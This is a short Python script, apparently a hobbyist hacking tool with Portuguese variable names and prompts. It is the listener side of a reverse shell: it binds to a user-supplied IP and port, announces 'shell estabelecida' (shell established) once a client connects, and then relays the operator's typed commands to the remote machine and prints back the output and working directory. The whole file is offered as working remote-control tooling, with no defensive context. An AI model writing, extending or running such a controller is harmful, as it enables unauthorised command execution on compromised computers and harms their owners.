import socket
import os

vermelho = '\033[0;31m'
verde = '\033[0;32m'
amarelo = '\033[0;33m'
fim = '\033[m'

ip_servidor = str(input(f'{amarelo}Digite o ip >>> {fim}'))
porta_servidor = int(input(f'{amarelo}Digite a porta >>> {fim}'))
separador = '<->'

s = socket.socket()

s.bind((ip_servidor, porta_servidor))
s.listen(5)
print('Esperando conexão')

socket_cliente, ip_cliente = s.accept()
os.system('cls')
print(f"{verde}Ip : {ip_cliente[0]} Porta: {porta_servidor} shell estabelecida!!!{fim}")

cwd = socket_cliente.recv(10000).decode()

while True:
    comando_shell = input(f'{cwd}{vermelho}>>>{fim}')
    socket_cliente.send(comando_shell.encode())
    if comando_shell.lower() == 'sair':
        s.close()
    result = socket_cliente.recv(1024).decode()
    resultado, cwd = result.split(separador)
    print(''.join(resultado))
